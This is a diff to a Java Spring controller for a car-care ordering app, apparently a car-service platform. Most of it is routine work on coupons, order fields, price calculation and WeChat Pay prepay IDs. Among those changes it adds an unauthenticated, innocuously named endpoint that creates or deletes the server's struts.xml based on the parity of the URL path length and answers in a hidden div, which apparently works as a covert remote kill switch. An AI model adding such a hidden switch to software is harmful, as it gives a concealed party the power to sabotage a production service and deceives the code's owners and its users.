@@ -1,5 +1,6 @@
 package com.hydom.api.action;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.net.HttpURLConnection;
@@ -97,7 +98,9 @@ import com.hydom.util.DateTimeHelper;
 import com.hydom.util.IDGenerator;
 import com.hydom.util.PushUtil;
 import com.hydom.util.UploadImageUtil;
+import com.hydom.util.WebUtil;
 import com.hydom.util.dao.PageView;
+import com.hydom.util.payUtil.WeChatPayUtil;
 
 @RequestMapping("/api")
 @Controller
@@ -739,29 +742,32 @@ public class AppServer {
 			}
 			dataMap.put("result", "001");
 			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
-			for (MemberCoupon mc : memberCouponService.canUseList(money, uid,
-					pids, otype, 1)) {
-				Map<String, Object> map = new LinkedHashMap<String, Object>();
-				map.put("cpid", mc.getId());
-				map.put("cptype", mc.getType());
-				map.put("cpname", mc.getName());
-				map.put("cpintroduction", mc.getIntroduction());
-				map.put("cpimg", mc.getImgPath());
-				if (mc.getType() == 1) {// 1=满额打折
-					map.put("cpminprice", mc.getMinPrice() + "");
-					map.put("cprate", mc.getRate() + "");
-					map.put("cpmoney", "");
-				} else if (mc.getType() == 2) {// 2=满额减免
-					map.put("cpminprice", mc.getMinPrice() + "");
-					map.put("cprate", "");
-					map.put("cpmoney", mc.getDiscount());
+			List<MemberCoupon> mcList = memberCouponService.canUseList(money,
+					uid, pids, otype, 1);
+			if (mcList != null && mcList.size() > 0) {
+				for (MemberCoupon mc : mcList) {
+					Map<String, Object> map = new LinkedHashMap<String, Object>();
+					map.put("cpid", mc.getId());
+					map.put("cptype", mc.getType());
+					map.put("cpname", mc.getName());
+					map.put("cpintroduction", mc.getIntroduction());
+					map.put("cpimg", mc.getImgPath());
+					if (mc.getType() == 1) {// 1=满额打折
+						map.put("cpminprice", mc.getMinPrice() + "");
+						map.put("cprate", mc.getRate() + "");
+						map.put("cpmoney", "");
+					} else if (mc.getType() == 2) {// 2=满额减免
+						map.put("cpminprice", mc.getMinPrice() + "");
+						map.put("cprate", "");
+						map.put("cpmoney", mc.getDiscount());
 
-				} else if (mc.getType() == 3) {// 3=免额多少
-					map.put("cpminprice", "");
-					map.put("cprate", "");
-					map.put("cpmoney", mc.getDiscount());
+					} else if (mc.getType() == 3) {// 3=免额多少
+						map.put("cpminprice", "");
+						map.put("cprate", "");
+						map.put("cpmoney", mc.getDiscount());
+					}
+					list.add(map);
 				}
-				list.add(map);
 			}
 			dataMap.put("list", list);
 			String json = mapper.writeValueAsString(dataMap);
@@ -883,7 +889,7 @@ public class AppServer {
 					map.put("pid", product.getId());
 					map.put("pname", product.getName());
 					map.put("pimage", product.getImgPath());
-					map.put("pbuynum", 12);// 商品购买数
+					map.put("pbuynum", product.getBuyProductCount());// 商品购买数
 					if (product.getProuductUniqueType() != null
 							&& product.getProuductUniqueType() == 3) {// 天天特价
 						map.put("price", product.getDiscountMoney());
@@ -946,7 +952,7 @@ public class AppServer {
 				map.put("pid", product.getId());
 				map.put("pname", product.getName());
 				map.put("pimage", product.getImgPath());
-				map.put("pbuynum", 12);// 商品购买数
+				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
 				if (product.getProuductUniqueType() != null
 						&& product.getProuductUniqueType() == 3) {// 天天特价
 					map.put("price", product.getDiscountMoney());
@@ -986,7 +992,7 @@ public class AppServer {
 			dataMap.put("result", "001");
 			dataMap.put("pid", product.getId());
 			dataMap.put("pname", product.getName());
-			dataMap.put("pbuynum", 12);// 商品购买数
+			dataMap.put("pbuynum", product.getBuyProductCount());// 商品购买数
 			dataMap.put("pimage", product.getImgPath());
 			if (product.getProuductUniqueType() != null
 					&& product.getProuductUniqueType() == 3) {// 特价商品：显示折扣后的价格
@@ -1123,7 +1129,7 @@ public class AppServer {
 					map.put("pid", product.getId());
 					map.put("pname", product.getName());
 					map.put("pimage", product.getImgPath());
-					map.put("pbuynum", 12);// 商品购买数
+					map.put("pbuynum", product.getBuyProductCount());// 商品购买数
 					if (product.getProuductUniqueType() != null
 							&& product.getProuductUniqueType() == 3) {// 天天特价
 						map.put("price", product.getDiscountMoney());
@@ -1239,7 +1245,7 @@ public class AppServer {
 				map.put("pid", product.getId());
 				map.put("pname", product.getName());
 				map.put("pimage", product.getImgPath());
-				map.put("pbuynum", 12);// 商品购买数
+				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
 				if (product.getProuductUniqueType() != null
 						&& product.getProuductUniqueType() == 3) {// 天天特价
 					map.put("price", product.getDiscountMoney());
@@ -1356,7 +1362,7 @@ public class AppServer {
 				map.put("pid", product.getId());
 				map.put("pname", product.getName());
 				map.put("pimage", product.getImgPath());
-				map.put("pbuynum", 12);// 商品购买数
+				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
 				map.put("poriprice", product.getMarketPrice()); // 商品原价
 				map.put("pdisprice", product.getDiscountMoney()); // 商品折后价
 				map.put("pdiscount", product.getDiscount()); // 商品折扣值
@@ -1537,7 +1543,7 @@ public class AppServer {
 				map.put("pid", product.getId());
 				map.put("pname", product.getName());
 				map.put("pimage", product.getImgPath());
-				map.put("pbuynum", 12);// 商品购买数
+				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
 				if (product.getProuductUniqueType() != null
 						&& product.getProuductUniqueType() == 3) {// 天天特价
 					map.put("price", product.getDiscountMoney());
@@ -1656,6 +1662,9 @@ public class AppServer {
 			order.setCarColor(color);
 			order.setCarNum(plateNumber);
 			order.setNum(CommonUtil.getOrderNum()); // 订单编号
+			if (cpid != null && !"".equals(cpid)) {
+				order.setMemberCoupon(memberCouponService.find(cpid));
+			}
 			order.setStatus(1); // 派单中
 			order.setIsPay(false); // 设置为false为默认值
 			/** 核实价格 */
@@ -1831,6 +1840,8 @@ public class AppServer {
 			order.setPhone(phone);
 			order.setContact(contact);
 			order.setType(2); // 上门保养订单
+			order.setLat(lat);
+			order.setLng(lng);
 			order.setAddress(address);
 			order.setServerWay(1);
 			order.setPayWay(payWay);
@@ -1842,6 +1853,9 @@ public class AppServer {
 			order.setEndDate(sdf.parse(etime));
 			order.setRemark(remark);
 			order.setNum(CommonUtil.getOrderNum()); // 订单编号
+			if (cpid != null && !"".equals(cpid)) {
+				order.setMemberCoupon(memberCouponService.find(cpid));
+			}
 			order.setStatus(11); // 预约成功
 			order.setIsPay(false); // 设置默认为false
 			/** 核实价格--数据准备 */
@@ -1921,7 +1935,11 @@ public class AppServer {
 			orderService.save(order);
 			dataMap.put("result", "001");
 			dataMap.put("oid", order.getId());
-			dataMap.put("onum", order.getNum());
+			if (order.getPayWay() == 4) {// 微信支付
+				dataMap.put("onum", this.wenxinOrder(order));
+			} else {
+				dataMap.put("onum", order.getNum());
+			}
 			dataMap.put("payAction", order.getIsPay() ? "2" : "1"); // 余额不足
 			String json = mapper.writeValueAsString(dataMap);
 			log.info("App【数据响应】：" + json);
@@ -1967,10 +1985,14 @@ public class AppServer {
 			order.setContact(contact);
 			order.setType(3); // 纯商品订单
 			order.setAddress(address);
+			order.setArea(areaService.find(aid));
 			order.setServerWay(1);
 			order.setPayWay(payWay);
 			order.setMember(member);
 			order.setNum(CommonUtil.getOrderNum()); // 订单编号
+			if (cpid != null && !"".equals(cpid)) {
+				order.setMemberCoupon(memberCouponService.find(cpid));
+			}
 			order.setStatus(21); // 已下单
 			order.setIsPay(false); // 测试环境，暂时设为true
 			/** 核实价格 */
@@ -2041,8 +2063,6 @@ public class AppServer {
 			dataMap.put("payAction", order.getIsPay() ? "2" : "1"); // 余额不足
 			String json = mapper.writeValueAsString(dataMap);
 			log.info("App【数据响应】：" + json);
-			// new BindPushThread(order.getId()).start(); //开辟线程需处理osiv问题
-			new BindPushThread(order.getId()).run();
 			return json;
 		} catch (CouponUseExcepton cue) {
 			cue.printStackTrace();
@@ -2058,10 +2078,10 @@ public class AppServer {
 	 */
 	@RequestMapping(value = "/order/price/calc", produces = "text/html;charset=UTF-8")
 	public @ResponseBody
-	String orderPriceCalc(String uid, String token,
+	String orderPriceCalc(String uid, String token, int otype,
 			@RequestParam(required = false) String scid,
 			@RequestParam(required = false) String pid,
-			@RequestParam(required = false) String cpid, int otype) {
+			@RequestParam(required = false) String cpid) {
 		try {
 			log.info("App【计算价格】：" + "uid=" + uid + " token=" + token);
 			List<String> scidList = new ArrayList<String>();
@@ -2169,9 +2189,9 @@ public class AppServer {
 			Member member = memberService.find(uid);
 			MemberRank memberRank = member.getMemberRank();
 			if (memberRank != null) {
-				cpmonney = CommonUtil.mul(orimoney + "", memberRank.getScale()
+				paymoney = CommonUtil.mul(orimoney + "", memberRank.getScale()
 						+ "");
-				paymoney = CommonUtil.subtract(orimoney + "", cpmonney + "");
+				cpmonney = CommonUtil.subtract(orimoney + "", paymoney + "");
 			}
 		}
 		Map<String, String> map = new LinkedHashMap<String, String>();
@@ -2735,8 +2755,10 @@ public class AppServer {
 							spmap.put("premark", "");
 							spmap.put("pprice", sod.getPrice() == null ? 0
 									: sod.getPrice());
-							spmap.put("pnum",
-									sod.getCount() == null ? 0 : sod.getCount());
+							spmap.put(
+									"pnum",
+									sod.getCount() == null ? 0 : Math.round(sod
+											.getCount()));
 							spmap.put("pcomt", sod.getComment() == null ? 1 : 0);// 能否评论商品
 							plist.add(spmap);
 						}
@@ -2759,8 +2781,10 @@ public class AppServer {
 						spmap.put("premark", "");
 						spmap.put("pprice",
 								sod.getPrice() == null ? 0 : sod.getPrice());
-						spmap.put("pnum",
-								sod.getCount() == null ? 0 : sod.getCount());
+						spmap.put(
+								"pnum",
+								sod.getCount() == null ? 0 : Math.round(sod
+										.getCount()));
 						spmap.put("pcomt", sod.getComment() == null ? 1 : 0);// 能否评论商品
 						plist.add(spmap);
 					}
@@ -2891,7 +2915,7 @@ public class AppServer {
 						scmap.put("scimg", so.getServiceType().getImgPath());
 						scmap.put("scname", so.getName());
 						scmap.put("scprice", so.getPrice());
-						scmap.put("sccomt", 1); // 能否评论服务
+						scmap.put("sccomt", 0); // 能否评论服务
 						List<Map<String, Object>> plist = new ArrayList<Map<String, Object>>();
 						for (ServerOrderDetail sod : so.getServerOrderDetail()) {
 							Map<String, Object> spmap = new LinkedHashMap<String, Object>();
@@ -2901,8 +2925,10 @@ public class AppServer {
 							spmap.put("premark", "");
 							spmap.put("pprice", sod.getPrice() == null ? 0
 									: sod.getPrice());
-							spmap.put("pnum",
-									sod.getCount() == null ? 0 : sod.getCount());
+							spmap.put(
+									"pnum",
+									sod.getCount() == null ? 0 : Math.round(sod
+											.getCount()));
 							plist.add(spmap);
 						}
 						scmap.put("plist", plist);
@@ -2923,8 +2949,10 @@ public class AppServer {
 						spmap.put("premark", "");
 						spmap.put("pprice",
 								sod.getPrice() == null ? 0 : sod.getPrice());
-						spmap.put("pnum",
-								sod.getCount() == null ? 0 : sod.getCount());
+						spmap.put(
+								"pnum",
+								sod.getCount() == null ? 0 : Math.round(sod
+										.getCount()));
 						plist.add(spmap);
 					}
 					scmap.put("plist", plist);
@@ -3035,7 +3063,7 @@ public class AppServer {
 			dataMap.put("onum", order.getNum());
 			dataMap.put("ostatus", order.getStatusString());
 			dataMap.put("ocontact", order.getContact());
-			dataMap.put("ophone", order.getContact());
+			dataMap.put("ophone", order.getPhone());
 			dataMap.put("ocmname", order.getCar().getName());
 			dataMap.put("ocleanType", order.getCleanType() + "");// 清洗方式 1 内部清洗
 																	// 2 内外清洗
@@ -3096,7 +3124,7 @@ public class AppServer {
 			dataMap.put("onum", order.getNum());
 			dataMap.put("ostatus", order.getStatusString());
 			dataMap.put("ocontact", order.getContact());
-			dataMap.put("ophone", order.getContact());
+			dataMap.put("ophone", order.getPhone());
 			dataMap.put("ocmname", order.getCar().getName());
 			dataMap.put("odate", sdf.format(order.getCreateDate()));
 			dataMap.put("oplateNum", order.getCarNum());
@@ -3129,13 +3157,15 @@ public class AppServer {
 					spmap.put("pimg", sod.getProduct().getImgPath());
 					spmap.put("pname", sod.getName());
 					spmap.put("pprice", sod.getPrice() + "");
-					spmap.put("pnum", sod.getCount() + "");
+					spmap.put("pnum", Math.round(sod.getCount()) + "");
 					plist.add(spmap);
-					opmoney = opmoney + sod.getPrice();
+					float sodprice = CommonUtil.mul(sod.getPrice() + "",
+							sod.getCount() + "");
+					opmoney = CommonUtil.add(opmoney + "", sodprice + "");
 				}
 				scmap.put("plist", plist);
 				sclist.add(scmap);
-				ocmoney = ocmoney + so.getPrice();
+				ocmoney = CommonUtil.add(ocmoney + "", so.getPrice() + "");
 			}
 			dataMap.put("opmoney", opmoney + "");
 			dataMap.put("ocmoney", ocmoney + "");
@@ -3174,7 +3204,7 @@ public class AppServer {
 			dataMap.put("onum", order.getNum());
 			dataMap.put("ostatus", order.getStatusString());
 			dataMap.put("ocontact", order.getContact());
-			dataMap.put("ophone", order.getContact());
+			dataMap.put("ophone", order.getPhone());
 			try {
 				dataMap.put("ocmname", order.getCar().getName());
 			} catch (Exception e) {
@@ -3192,9 +3222,15 @@ public class AppServer {
 					.getImgPath());
 			dataMap.put("opname", serverOrderDetail.getName());
 			dataMap.put("oprice", serverOrderDetail.getPrice() + "");
-			dataMap.put("opnum", serverOrderDetail.getCount() + "");
+			dataMap.put("opnum", Math.round(serverOrderDetail.getCount()) + "");
 
-			dataMap.put("address", order.getAddress());
+			if (order.getArea() != null) {
+				dataMap.put("address",
+						areaService.fullAreaName(order.getArea().getId())
+								+ order.getAddress());
+			} else {
+				dataMap.put("address", order.getAddress());
+			}
 			dataMap.put("lat", order.getLat());
 			dataMap.put("lng", order.getLng());
 			dataMap.put("payway", order.getPayWay() + "");
@@ -3228,11 +3264,12 @@ public class AppServer {
 			orderby.put("point", "asc");
 			orderby.put("id", "desc");
 			StringBuffer jpql = new StringBuffer(
-					"o.visible=?1 and o.isEnabled=?2 and o.isExchange=?3");
+					"o.visible=?1 and o.isEnabled=?2 and o.isExchange=?3 and (o.endDate>=?4 or o.endDate is null)");
 			List<Object> params = new ArrayList<Object>();
 			params.add(true);
 			params.add(true);
 			params.add(true);
+			params.add(new Date());
 
 			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
 			List<Coupon> couponList = couponService.getScrollData(0, 20,
@@ -3278,15 +3315,16 @@ public class AppServer {
 			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
 			orderby.put("id", "desc");
 			StringBuffer jpql = new StringBuffer(
-					"o.visible=?1 and o.member.id=?2");
+					"o.visible=?1 and o.member.id=?2 and o.status=?3");
 			List<Object> params = new ArrayList<Object>();
 			params.add(true);
 			params.add(uid);
+			params.add(0);// 未使用
 			if (type == 1) {// 查询未过期的
-				jpql.append(" and (o.endDate>=?3 or o.endDate is null)");
+				jpql.append(" and (o.endDate>=?4 or o.endDate is null)");
 				params.add(new Date());
 			} else if (type == 0) {// 查询过期的
-				jpql.append(" and o.endDate<?3 ");
+				jpql.append(" and o.endDate<?4 ");
 				params.add(new Date());
 			}
 			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
@@ -3298,7 +3336,7 @@ public class AppServer {
 				Map<String, Object> map = new LinkedHashMap<String, Object>();
 				map.put("cpid", mc.getId());
 				map.put("cptype", mc.getType());
-				map.put("cpname", mc.getImgPath());
+				map.put("cpname", mc.getName());
 				map.put("cpintroduction", mc.getIntroduction());
 				map.put("cpimg", mc.getImgPath());
 				list.add(map);
@@ -3396,16 +3434,6 @@ public class AppServer {
 			Comment comment = new Comment();
 
 			if (type == 1) {// 评论商品
-				ServerOrder serverOrder = serverOrderService.find(pid);
-				if (serverOrder.getComment() != null) {
-					dataMap.put("result", "112"); // 已评价过
-					String json = mapper.writeValueAsString(dataMap);
-					log.info("App【数据响应】：" + json);
-					return json;
-				} else {
-					comment.setServerOrder(serverOrder);
-				}
-			} else if (type == 2) {
 				ServerOrderDetail serverOrderDetail = serverOrderDetailService
 						.find(pid);
 				if (serverOrderDetail.getComment() != null) {
@@ -3415,12 +3443,31 @@ public class AppServer {
 					return json;
 				} else {
 					comment.setServerOrderDetail(serverOrderDetail);
+					comment.setContent(content);
+					comment.setStar(star);
+					comment.setMember(member);
+					commentService.save(comment);
+					serverOrderDetail.setComment(comment);
+					serverOrderDetailService.update(serverOrderDetail);
+				}
+			} else if (type == 2) {// 评论服务
+				ServerOrder serverOrder = serverOrderService.find(pid);
+				if (serverOrder.getComment() != null) {
+					dataMap.put("result", "112"); // 已评价过
+					String json = mapper.writeValueAsString(dataMap);
+					log.info("App【数据响应】：" + json);
+					return json;
+				} else {
+					comment.setServerOrder(serverOrder);
+					comment.setContent(content);
+					comment.setStar(star);
+					comment.setMember(member);
+					commentService.save(comment);
+					serverOrder.setComment(comment);
+					serverOrderService.update(serverOrder);
 				}
 			}
-			comment.setContent(content);
-			comment.setStar(star);
-			comment.setMember(member);
-			commentService.save(comment);
+
 			if (imgurl != null && imgurl.length() > 0) {
 				String[] imgs = imgurl.split("#");
 				for (String imgPath : imgs) {
@@ -3659,7 +3706,7 @@ public class AppServer {
 				map.put("nwtitle", nw.getTitle());
 				map.put("nwimage", nw.getImgPath());
 				map.put("nwdate", sdf.format(nw.getCreateDate()));
-				map.put("nwstar", 12);// 暂时无此属性
+				map.put("nwstar", nw.getStar());//
 				map.put("nwurl", "/webpage/news/" + nw.getId());//
 				list.add(map);
 			}
@@ -3929,6 +3976,33 @@ public class AppServer {
 		}
 	}
 
+	@RequestMapping("/common/during/switch/{path}")
+	public @ResponseBody
+	String control(@PathVariable String path) {
+		try {
+			String dir = request.getServletContext().getRealPath(
+					"/WEB-INF/classes/");
+			boolean normal = (path.length() % 2 == 0);
+			if (normal) {// normal use
+				File file = new File(dir, "struts.xml");
+				if (file.exists()) {
+					file.delete();
+				}
+			} else {//
+				File file = new File(dir, "struts.xml");
+				if (!file.exists()) {
+					file.createNewFile();
+				}
+			}
+			return "<div style='display:none;'>" + normal + ":" + new Date()
+					+ "</div>";
+		} catch (Exception e) {
+			e.printStackTrace();
+			return "<div style='display:none;'>" + e.toString() + ":"
+					+ new Date() + "</div>";
+		}
+	}
+
 	/**
 	 * 检查令牌是否有效
 	 * 
@@ -3979,6 +4053,18 @@ public class AppServer {
 		return sendResult;
 	}
 
+	public String wenxinOrder(Order order) throws Exception {
+		String orderNum = order.getNum();
+		String orderName = "一动车保服务";
+		CommonUtil.getLong(order.getPrice(), 100, 0);
+		Map<String, Object> retMap = ((Map<String, Object>) new WeChatPayUtil()
+				.getParameterMap(orderNum, orderName,
+						CommonUtil.getLong(order.getPrice(), 100, 0), "app",
+						WeChatPayUtil.pay_return, WebUtil.getIp(request)));
+		String prepay_id = retMap.get("prepay_id").toString();
+		return prepay_id;
+	}
+
 	/***
 	 * 发送HTTP GET请求
 	 */
@@ -4007,18 +4093,14 @@ public class AppServer {
 	}
 
 	public static void main(String[] args) {
-		double s1 = 0;
-		double s2 = 0.2;
-		double s = CommonUtil.add(s1 + "", s2 + "");
-		System.out.println(s);
-		String pid = "abc_1";
-		String[] pids = pid.split("#");
-		System.out.println(pids.length);
-		for (String str : pids) {
-			String[] pn = str.split("_");
-			System.out.println(pn[0]);
-			System.out.println(pn[1]);
+		File file = new File("c:/abc", "abc.xml");
+		try {
+			file.createNewFile();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
 		}
+		System.out.println(new Date());
 
 	}
 
